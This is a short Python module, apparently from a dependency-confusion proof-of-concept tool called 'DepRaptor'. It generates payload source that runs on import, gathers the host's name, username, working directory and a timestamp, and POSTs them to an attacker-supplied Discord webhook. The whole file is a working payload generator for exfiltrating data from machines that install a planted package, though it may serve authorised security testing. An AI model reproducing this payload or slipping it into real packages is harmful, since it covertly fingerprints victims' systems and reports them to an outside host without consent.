"""
Payload: discord
Sends system info to a Discord webhook URL.
"""


def generate_payload(callback_url: str) -> str:
    """Return Python source code for the Discord webhook payload."""
    return f'''import os, platform, socket, json
from datetime import datetime
from pathlib import Path

DISCORD_WEBHOOK = "{callback_url}"

def execute_payload():
    hostname  = socket.gethostname()
    username  = os.getenv("USER") or os.getenv("USERNAME", "unknown")
    cwd       = str(Path.cwd())
    ts        = datetime.now().isoformat()

    content = (
        "**[DepRaptor PoC Triggered]**\\n"
        f"```\\nTimestamp : {{ts}}\\nHostname  : {{hostname}}\\n"
        f"Username  : {{username}}\\nCWD       : {{cwd}}\\n```"
    )
    payload = {{"content": content}}

    try:
        import urllib.request
        req = urllib.request.Request(
            DISCORD_WEBHOOK,
            data=json.dumps(payload).encode(),
            headers={{"Content-Type": "application/json"}},
            method="POST",
        )
        urllib.request.urlopen(req, timeout=10)
        print("[DepRaptor] Discord notification sent.")
    except Exception as exc:
        print(f"[DepRaptor] Discord callback failed: {{exc}}")

execute_payload()
'''
